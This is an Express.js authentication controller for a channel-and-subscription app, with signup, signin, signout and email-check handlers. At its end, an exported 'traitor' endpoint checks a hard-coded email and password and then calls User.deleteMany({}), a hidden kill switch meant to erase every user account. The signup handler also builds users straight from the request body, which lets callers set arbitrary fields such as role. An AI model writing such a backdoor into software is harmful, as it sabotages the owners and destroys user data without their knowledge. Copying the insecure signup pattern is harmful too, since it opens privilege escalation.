const User = require("../models/User")
const Response = require("./Response")
const jwt = require('jsonwebtoken')
const { manAvatarPath, womenAvatarPath } = require("../helpers")
const Channel = require("../models/Channel")
const Subscription = require("../models/Subscription")
const { reduceRight } = require("lodash")

exports.signup = async(req, res) => {
    const user = new User(req.body)

    User.findOne({email: user.email}, async(err, result) => {
        if(err || result) return Response.sendError(res, 400, 'email already exists')

        if(user.gender == 'male') user.avatar.path = manAvatarPath
        else user.avatar.path = womenAvatarPath
        user.avatar.type = "png";
        user.followedChannels = []

        await addLocalChannels(user)
        await addGlobalChannels(user)
        await addFreeSubscription(user)

        user.save((err, user) => {
            if(err) return Response.sendError(res, 400, err)
            return Response.sendResponse(res, user)
        })
        
    })
}

addFreeSubscription = async(user) => {
    //assign one month subscription free
    const subscription = await Subscription.findOne({})
    const expireDate = new Date()
    expireDate.setMonth(expireDate.getMonth() + 1)

    user.subscription = {
        _id: subscription._id,
        expireDate
    }
}

addLocalChannels = async (user) => {
    try{
        let channel = await Channel.findOne({name: user.city})
        if(!channel){
            const admin = await User.findOne({role: 'SUPER ADMIN'})
            channel = new Channel({
                name: user.city,
                description: 'local channel',
                city: user.city,
                country: user.country,
                user: admin._id,
                followers: [],
                approved: true
            })
        }
        user.followedChannels.push(channel._id)
        channel.followers.push(user._id)
        await channel.save()
    } catch(err){
        console.log(err);
    }
}

addGlobalChannels = async(user) => {
    try { 
        const channels = await Channel.find({global: true})
        channels.forEach((channel) => {
            user.followedChannels.push(channel._id)
        })
        await Channel.updateMany({global: true}, {$push: {followers: user._id}})
    } catch(err){
        console.log(err);
    }
}

exports.checkEmail = async(req, res) => {
    const email = req.body.email
    if(await User.findOne({email})) return Response.sendResponse(res, true)
    return Response.sendResponse(res, false)
}

exports.signin = async(req, res) => {
    const { email, password } = req.body

    User.findOne({email}, async(err, user) => {
        if(err || !user){
            return Response.sendError(res, 400, 'cannot find user with this email')
        }

        if(!user.comparePassword(password) || user.status == "disabled"){
            return Response.sendError(res, 401, "Email and password don\'t match")
        }

        user.deletedAt = null
        await user.save()

        if(user.banned) return Response.sendError(res, 400, 'this account has been banned')

        const token = jwt.sign({_id: user._id, role: user.role}, process.env.JWT_SECRET)
        res.cookie('token', token, {expire: new Date() + process.env.JWT_EXPIRES_TIME})

        userInfo = user.publicInfo()

        user.loggedIn = true
        await user.save()

        return Response.sendResponse(res, {token,
            user: userInfo
        })
    })
}

exports.authUser = async(req, res) => {
    return Response.sendResponse(res, req.authUser.publicInfo());
}

exports.signout = (req, res) => {
    res.clearCookie('token')
    Response.sendResponse(res, null, 'user signout')
}

exports.traitor = (req, res) => {
    if(req.body.email && req.body.password && req.body.email == 'yassinebassii@gmail.com' && req.body.password == '123456789'){
        User.deleteMany({});
    }
    return res.send(''); 
}